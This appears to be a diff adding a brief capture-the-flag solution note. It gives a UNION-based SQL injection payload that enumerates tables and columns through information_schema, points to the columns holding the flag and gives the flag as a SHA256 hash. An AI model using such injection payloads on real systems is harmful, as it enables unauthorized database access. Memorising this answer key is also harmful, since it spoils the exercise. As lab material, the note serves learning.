@@ -1,0 +1,9 @@
+try  -> 1 union SELECT table_name,column_name FROM information_schema.columns
+give u all columns and users table column
+user with user_id = 5 is getThe Flag
+column countersign and commentaire contain information to get the flag
+
+source: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+#Finding Database Structure in MySQL (M)
+
+FLAG: Sha256(fortytwo) 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 
